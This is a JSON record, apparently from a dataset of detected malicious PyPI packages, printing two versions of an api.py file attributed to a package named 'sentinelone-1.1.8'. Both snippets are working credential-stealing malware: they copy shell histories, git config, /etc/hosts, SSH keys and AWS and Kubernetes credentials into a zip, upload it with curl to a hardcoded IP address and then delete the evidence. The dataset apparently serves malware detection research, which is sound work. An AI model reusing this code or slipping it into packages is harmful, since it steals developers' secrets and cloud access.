[
  {
    "pyfile": "api.py",
    "malicious_code_snippets": "import os\nimport pwd\nimport shutil\nimport subprocess\nimport io\nimport zipfile\n\ndef get_hosts():\n    with open('/etc/hosts', 'r') as f:\n        return (f.read())\n\ndef get_username():\n    return pwd.getpwuid(os.getuid())[0]\n\ndef subprocess_popen(statement):\n    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)\n    while p.poll() is None:\n        if p.wait() is not 0:\n            return False\n        else:\n            re = p.stdout.readlines()\n            result = []\n            for i in range(len(re)):\n                res = re[i].decode('utf-8').strip('\\r\\n')\n                result.append(res)\n            return result\n\ndef zip_ya(start_dir):\n    start_dir = start_dir\n    file_news = start_dir + '.zip'\n    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)\n    for dir_path, dir_names, file_names in os.walk(start_dir):\n        f_path = dir_path.replace(start_dir, '')\n        f_path = f_path and f_path + os.sep or ''\n        for filename in file_names:\n            z.write(os.path.join(dir_path, filename), f_path + filename)\n    z.close()\n    return file_news\n\ndef writeFile(serialId='default'):\n    username = get_username()\n    foldername = '/Users/' + username + '/Library/Logs/tmp'\n    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n    if os.path.exists(foldername):\n        shutil.rmtree(foldername)\n    os.makedirs(foldername)\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n    bashHistory = '/Users/' + username + '/.bash_history'\n    zshHistory = '/Users/' + username + '/.zsh_history'\n    gitConfig = '/Users/' + username + '/.gitConfig'\n    hosts = '/etc/hosts'\n    ssh = '/Users/' + username + '/.ssh'\n    zhHistory = '/Users/' + username + '/.zhHistory'\n    aws = '/home/' + username + '/.aws'\n    kube = '/home/' + username + '/.kube'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    if os.path.exists(aws):\n        shutil.copyfile(aws, foldername + '/aws')\n    if os.path.exists(kube):\n        shutil.copyfile(kube, foldername + '/kube')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)\n\ndef writeFile1(serialId='default'):\n    username = get_username()\n    filename = '/home/'+username+'/tmp/tmp.txt'\n    filename = '/home/'+username+'/tmp/tmp.zip'\n    foldername = '/home/'+username+'/tmp'\n    if os.path.exists(foldername):\n        shutil.rmtree(foldername)\n    os.makedirs(foldername)\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n    if username !=\"root\":\n        bashHistory = '/home/' + username + '/.bash_history'\n        zshHistory = '/home/' + username + '/.zsh_history'\n        gitConfig = '/home/' + username + '/.gitConfig'\n        hosts = '/etc/hosts'\n        ssh = '/home/' + username + '/.ssh'\n        zhHistory = '/home/' + username + '/.zhHistory'\n        aws = '/home/' + username + '/.aws'\n        kube = '/home/' + username + '/.kube'\n    else:\n        bashHistory = '/root/.bash_history'\n        zshHistory = '/root/.zsh_history'\n        gitConfig = '/root/.gitConfig'\n        hosts = '/etc/hosts'\n        ssh = '/root/.ssh'\n        zhHistory = '/root/.zhHistory'\n        aws = '/root/.aws'\n        kube = '/root/.kube'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    if os.path.exists(aws):\n        shutil.copyfile(aws, foldername + '/aws')\n    if os.path.exists(kube):\n        shutil.copyfile(kube, foldername + '/kube')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)\n\ndef run():\n    if sys.platform == \"darwin\":\n        writeFile()\n    elif sys.platform == \"linux\":\n        writeFile1()"
  },
  {
    "pyfile": "api.py",
    "malicious_code_snippets": "import os\nimport pwd\nimport shutil\nimport zipfile\nimport io\nimport platform\nimport subprocess\n\ndef get_hosts():\n    with open('/etc/hosts', 'r') as f:\n        return (f.read())\n\ndef get_username():\n    return pwd.getpwuid(os.getuid())[0]\n\ndef subprocess_popen(statement):\n    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)\n    while p.poll() is None:\n        if p.wait() is not 0:\n            return False\n        else:\n            re = p.stdout.readlines()\n            result = []\n            for i in range(len(re)):\n                res = re[i].decode('utf-8').strip('\\r\\n')\n                result.append(res)\n            return result\n\ndef zip_ya(start_dir):\n    start_dir = start_dir\n    file_news = start_dir + '.zip'\n    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)\n    for dir_path, dir_names, file_names in os.walk(start_dir):\n        f_path = dir_path.replace(start_dir, '')\n        f_path = f_path and f_path + os.sep or ''\n        for filename in file_names:\n            z.write(os.path.join(dir_path, filename), f_path + filename)\n    z.close()\n    return file_news\n\ndef writeFile(serialId='default'):\n    username = get_username()\n    foldername = '/Users/' + username + '/Library/Logs/tmp'\n    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'\n    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'\n    if os.path.exists(foldername):\n        shutil.rmtree(foldername)\n    os.makedirs(foldername)\n    with open(filename, 'a+') as file:\n        file.write('hosts : [{}]'.format(get_hosts()) + '\\n')\n        file.write('username : ' + get_username() + '\\n')\n        file.write('test : [{}]'.format(subprocess_popen(\"bash -c ls /\")) +'\\n')\n    bashHistory = '/Users/' + username + '/.bash_history'\n    zshHistory = '/Users/' + username + '/.zsh_history'\n    gitConfig = '/Users/' + username + '/.gitConfig'\n    hosts = '/etc/hosts'\n    ssh = '/Users/' + username + '/.ssh'\n    zhHistory = '/Users/' + username + '/.zhHistory'\n    serialId = str(subprocess_popen(\"hostname\"))\n    if os.path.exists(bashHistory):\n        shutil.copyfile(bashHistory, foldername + '/bashHistory')\n    if os.path.exists(zshHistory):\n        shutil.copyfile(zshHistory, foldername + '/zsh_history')\n    if os.path.exists(gitConfig):\n        shutil.copyfile(gitConfig, foldername + '/gitConfig')\n    if os.path.exists(hosts):\n        shutil.copyfile(hosts, foldername + '/hosts')\n    if os.path.exists(ssh):\n        shutil.copytree(ssh, foldername + '/ssh')\n    if os.path.exists(zhHistory):\n        shutil.copyfile(zhHistory, foldername + '/zhHistory')\n    zip_ya(foldername)\n    shutil.rmtree(foldername)\n    command = \"curl -k -F \\\"file=@\" + zipname + \"\\\" \\\"https://54.254.189.27/api/v1/file/upload\\\" > /dev/null 2>&1\"\n    os.system(command)\n    os.remove(zipname)\n\ndef run():\n    writeFile()"
  },
  {
    "metadata": {
      "package_name": "sentinelone-1.1.8",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/sentinelone-1.1.8.txt"
    }
  }
]